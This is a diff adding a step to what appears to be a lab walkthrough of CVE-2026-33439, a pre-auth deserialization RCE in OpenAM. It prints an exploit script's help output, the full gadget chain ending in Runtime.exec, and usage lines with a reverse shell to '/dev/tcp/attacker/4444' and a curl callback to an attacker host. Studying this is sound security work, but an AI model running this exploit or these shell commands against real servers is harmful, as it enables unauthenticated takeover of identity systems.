@@ -568,7 +568,109 @@ Jars/: click-extras-2.3.0.jar  click-nodeps-2.3.0.jar  jato-shaded-16.0.5.jar
 <br>
 </div>
 
+#### 3.3 Confirm the exploit interface and deserialization sink (Section 3: Exploitation & Initial Access)
 
+**Why this step:** Before execution, confirm how the PoC is driven and verify its described sink matches the advisory, so the run is deliberate rather than copy-paste.
+
+**Command:**
+
+shell
+
+```shell
+python3 '02 Exploit/Exploit_CVE_2026_33439.py' -h
+```
+
+**Result:**
+
+```
+
+  ██████╗ ██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██╗  ██╗█████╗  ██████╗
+  ██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██╔═══╝      ╚════██╗╚════██╗██║  ██║╚════██╗██╔══██
+  ██║     ██║   ██║█████╗       █████╔╝██║██╔██║ █████╔╝███████╗      █████╔╝ █████╔╝███████║█████╔╝╚██████║
+  ██║     ╚██╗ ██╔╝██╔══╝      ██╔═══╝ ████╔╝██║██╔═══╝ ██═══██║      ╚═══██╗ ╚═══██╗ ╚═══██║╚═══██╗╚════██║
+  ╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     █████╔╝ █████╔╝      ██║█████╔╝ █████╔╝
+  ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝       ╚════╝  ╚════╝       ╚═╝╚════╝  ╚════╝
+
+  CVE-2026-33439 | OpenAM Pre-Auth RCE via jato.clientSession Deserialization | CVSS 9.3 CRITICAL | CWE-502
+  Author: TheMalwareGuardian - github.com/TheMalwareGuardian
+
+usage: Exploit_CVE_2026_33439.py [-h] --url URL [--command COMMAND] [--jars JARS] [--endpoint ENDPOINT] [--method {GET,POST}] [--proxy PROXY]
+
+CVE-2026-33439 - OpenAM Pre-Auth RCE via jato.clientSession
+
+options:
+  -h, --help           show this help message and exit
+  --url URL            OpenAM base URL (e.g. http://openam.lab.local:8080/openam)
+  --command COMMAND    OS command to execute on the target (default: touch /tmp/pwned)
+  --jars JARS          Directory containing the required JARs (default: current directory)
+  --endpoint ENDPOINT  Specific JATO endpoint (default: auto-probe all candidates)
+  --method {GET,POST}  HTTP delivery method (default: GET)
+  --proxy PROXY        HTTP proxy (e.g. http://127.0.0.1:8080)
+
+CVE-2026-33439 - OpenAM Pre-Auth RCE via jato.clientSession Deserialization
+
+Author    : TheMalwareGuardian
+GitHub    : https://github.com/TheMalwareGuardian
+Reference : https://github.com/OpenIdentityPlatform/OpenAM/security/advisories/GHSA-2cqq-rpvq-g5qj
+
+Description:
+        OpenAM deserializes the jato.clientSession HTTP parameter via ClientSession.deserializeAttributes() → Encoder.deserialize() → ApplicationObjectInputStream.readObject() with NO class whitelist.
+        The WhitelistObjectInputStream fix applied to jato.pageSession after CVE-2021-35464 was never extended to jato.clientSession.
+
+Gadget Chain (uses only classes bundled in the OpenAM WAR):
+        PriorityQueue.readObject()                                 [java.util - JDK]
+        → heapify() → siftDown() → comparator.compare()
+                → Column$ColumnComparator.compare(o1, o2)              [openam-core-16.0.5.jar]
+                → Column.getTable().isSortedAscending()                [click-nodeps-2.3.0.jar]
+                → Column.getProperty(o1)
+                        → PropertyUtils.getObjectPropertyValue(            [openam-core-16.0.5.jar]
+                                o1, "outputProperties")
+                        → TemplatesImpl.getOutputProperties()              [xalan-2.7.3.jar]
+                                → defineTransletClasses()
+                                → TransletClassLoader.defineClass(_bytecodes)
+                                        → EvilTranslet.<clinit>()                  [attacker bytecode]
+                                        → Runtime.getRuntime().exec(cmd)
+
+Requirements:
+        JDK 21 (javac)            - must match OpenAM JVM version
+        openam-core-16.0.5.jar    - Column, PropertyUtils
+        xalan-2.7.3.jar           - TemplatesImpl, TransformerFactoryImpl
+        serializer-2.7.3.jar      - SerializationHandler (EvilTranslet interface)
+        click-nodeps-2.3.0.jar    - Table (required by Column$ColumnComparator)
+        click-extras-2.3.0.jar    - transitive dependency of click-nodeps
+        jato-shaded-16.0.5.jar    - Encoder (encoding verification only)
+        servlet-api.jar           - Jakarta Servlet API (Table serialization)
+        Python 3.8+, requests
+
+Setup (copy JARs from OpenAM container - run from PowerShell on host):
+        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/openam-core-16.0.5.jar .
+        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/xalan-2.7.3.jar .
+        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/serializer-2.7.3.jar .
+        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/click-nodeps-2.3.0.jar .
+        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/click-extras-2.3.0.jar .
+        docker cp cve_2026_33439_openam:/usr/local/tomcat/webapps/openam/WEB-INF/lib/jato-shaded-16.0.5.jar .
+        docker cp cve_2026_33439_openam:/usr/local/tomcat/lib/servlet-api.jar .
+
+Usage:
+        python3 Exploit_CVE_2026_33439.py --url http://openam.lab.local:8080/openam --command "touch /tmp/pwned"
+        python3 Exploit_CVE_2026_33439.py --url http://openam.lab.local:8080/openam --command "bash -i >& /dev/tcp/attacker/4444 0>&1"
+        python3 Exploit_CVE_2026_33439.py --url http://openam.lab.local:8080/openam --command "curl http://attacker:9999/pwned" --proxy http://127.0.0.1:8080
+```
+
+**Result (key facts):**
+
+```
+Sink:  ClientSession.deserializeAttributes() -> Encoder.deserialize()
+       -> ApplicationObjectInputStream.readObject()   [NO class whitelist]
+Cause: the CVE-2021-35464 WhitelistObjectInputStream fix on jato.pageSession
+       was never extended to jato.clientSession
+Args:  --url (OpenAM base, include /openam)  --command  --jars  --endpoint
+       --method {GET,POST}  --proxy
+```
+
+**What this gives you:** A confirmed invocation interface and a sink matching GHSA-2cqq-rpvq-g5qj. **Key finding:** the deserialization reads an attacker-controlled parameter with no allow-list, exactly the gap described in 3.2.1. The script auto-probes all three JATO endpoints by default.
+
+**Next:** Prove blind code execution out-of-band before attempting a shell.
 <div align="center">
 <br>
 <br>
